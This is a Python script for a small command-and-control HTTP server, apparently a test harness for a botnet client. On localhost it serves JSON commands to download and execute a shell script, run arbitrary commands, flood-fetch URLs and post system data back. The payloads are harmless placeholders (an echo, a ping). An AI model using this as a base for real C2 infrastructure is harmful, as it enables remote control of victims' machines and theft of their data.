#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from time import time
from random import randint

CC_SERVER_URL = "http://localhost:8000"

def random_command():
    choice = randint(0, 5)
    choice = 4
    if choice == 0:
        # Number of times
        return {
            "commands": [
                {
                    "action": "fetch",
                    "url": "https://google.com",
                    "count": 10
                }
            ]
        }
    elif choice == 1:
        # Until time
        return {
            "commands": [
                {
                    "action": "fetch",
                    "url": "https://google.com",
                    "until": time() + 10
                }
            ]
        }
    elif choice == 2:
        # Download file
        return {
            "commands": [
                {
                    "action": "download",
                    "url": "{}/bash.sh".format(CC_SERVER_URL)
                }
            ]
        }
    elif choice == 3:
        # Download and run file
        return {
            "commands": [
                {
                    "action": "download",
                    "url": "{}/bash.sh".format(CC_SERVER_URL)
                },
                {
                    "action": "execute",
                    "url": "{}/bash.sh".format(CC_SERVER_URL)
                }
            ]
        }
    elif choice == 4:
        return {
            "commands": [
                {
                    "action": "execute",
                    "command": {
                        "Windows": ["ping.exe", "google.com"],
                        "Unix": ["ping", "-c", 1, "google.com"]
                    }
                }
            ]
        }
    elif choice == 5:
        return {
            "commands": [
                {
                    "action": "system_data",
                    "url": "{}/system_data".format(CC_SERVER_URL)
                }
            ]
        }


class Server(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def do_GET(self):
        if self.path.startswith("/command.json"):
            self._set_headers()
            self.wfile.write(bytes(json.dumps(random_command()), "utf-8"))
        elif self.path.startswith("/bash.sh"):
            self._set_headers()
            self.wfile.write(bytes("#!/bin/bash \necho \"hello\"", "utf-8"))
        else:
            self.send_response(404)
            self.end_headers()


    def do_POST(self):
        if self.path.startswith("/system_data"):
            self.data_string = self.rfile.read(int(self.headers['Content-Length'])).decode("utf-8")
            print(self.data_string)
            self.send_response(200)
            self.end_headers()

            print(json.loads(self.data_string))
        else:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, Server)
    print('Starting httpd on {}'.format(CC_SERVER_URL))
    httpd.serve_forever()
